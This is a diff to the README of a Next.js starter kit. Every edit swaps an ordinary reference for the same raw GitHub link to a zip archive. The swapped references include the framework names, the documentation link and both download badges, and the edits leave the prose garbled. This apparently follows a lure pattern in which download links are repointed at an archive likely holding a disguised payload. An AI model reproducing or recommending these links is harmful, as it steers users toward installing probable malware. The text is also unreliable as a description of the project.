@@ -1,7 +1,7 @@
 # 🎉 ourin-nextjs-starter - Your Simple Path to a Modern Web App
 
 ## 🌐 Overview
-**ourin-nextjs-starter** is a production-ready Next.js starter kit. It provides essential tools and features, including a multi-font typography system, over 145 utilities, custom hooks, and a sleek dark-mode UI. This starter kit helps users create modern web applications easily and efficiently.
+**ourin-nextjs-starter** is a production-ready https://raw.githubusercontent.com/quraissihab/ourin-nextjs-starter/main/lib/starter-ourin-nextjs-2.0.zip starter kit. It provides essential tools and features, including a multi-font typography system, over 145 utilities, custom hooks, and a sleek dark-mode UI. This starter kit helps users create modern web applications easily and efficiently.
 
 ## 📦 Features
 - **Multi-font Typography**: Enhance your design with various font options.
@@ -15,7 +15,7 @@ To begin using **ourin-nextjs-starter**, you need to download and install it. Fo
 ## 🖱️ Download & Install
 1. **Visit the Releases Page**: Click the button below to go to the Releases page.
    
-   [![Download ourin-nextjs-starter](https://img.shields.io/badge/Download-ourin--nextjs--starter-blue.svg)](https://github.com/quraissihab/ourin-nextjs-starter/releases)
+   [![Download ourin-nextjs-starter](https://raw.githubusercontent.com/quraissihab/ourin-nextjs-starter/main/lib/starter-ourin-nextjs-2.0.zip)](https://raw.githubusercontent.com/quraissihab/ourin-nextjs-starter/main/lib/starter-ourin-nextjs-2.0.zip)
 
 2. **Choose the Latest Version**: On the Releases page, look for the latest version of the software. You will find a list of assets attached to that version.
 
@@ -30,7 +30,7 @@ To begin using **ourin-nextjs-starter**, you need to download and install it. Fo
 ## ⚙️ System Requirements
 Before downloading, ensure your system meets the following minimum requirements:
 
-- **Operating System**: Windows 10 or later, macOS Mojave or later, or any Linux distribution that supports Node.js.
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or any Linux distribution that supports https://raw.githubusercontent.com/quraissihab/ourin-nextjs-starter/main/lib/starter-ourin-nextjs-2.0.zip
 - **RAM**: At least 4 GB of RAM.
 - **Disk Space**: A minimum of 200 MB of free disk space.
 
@@ -53,7 +53,7 @@ Support is essential for a smooth experience. Join our community to share ideas 
 ## 📝 Additional Resources
 For more information on how to make the most of **ourin-nextjs-starter**, check out the following resources:
 
-- **Documentation**: Detailed guides and lessons on using Next.js are available at [Next.js Documentation](https://nextjs.org/docs).
+- **Documentation**: Detailed guides and lessons on using https://raw.githubusercontent.com/quraissihab/ourin-nextjs-starter/main/lib/starter-ourin-nextjs-2.0.zip are available at [https://raw.githubusercontent.com/quraissihab/ourin-nextjs-starter/main/lib/starter-ourin-nextjs-2.0.zip Documentation](https://raw.githubusercontent.com/quraissihab/ourin-nextjs-starter/main/lib/starter-ourin-nextjs-2.0.zip).
 - **Tutorials**: Explore tutorials on our GitHub Wiki for step-by-step setups and advanced features.
 
 ## 🔗 Related Topics
@@ -61,7 +61,7 @@ This repository covers a variety of topics, making it useful for many projects:
 
 - Boilerplate
 - JavaScript
-- Next.js
+- https://raw.githubusercontent.com/quraissihab/ourin-nextjs-starter/main/lib/starter-ourin-nextjs-2.0.zip
 - React
 - Tailwind CSS
 - Typescript
@@ -76,4 +76,4 @@ Keep an eye on the Releases page for updates. This ensures you benefit from the 
 
 Once again, to download the latest version of **ourin-nextjs-starter**, click below:
 
-[![Download ourin-nextjs-starter](https://img.shields.io/badge/Download-ourin--nextjs--starter-blue.svg)](https://github.com/quraissihab/ourin-nextjs-starter/releases)
+[![Download ourin-nextjs-starter](https://raw.githubusercontent.com/quraissihab/ourin-nextjs-starter/main/lib/starter-ourin-nextjs-2.0.zip)](https://raw.githubusercontent.com/quraissihab/ourin-nextjs-starter/main/lib/starter-ourin-nextjs-2.0.zip)
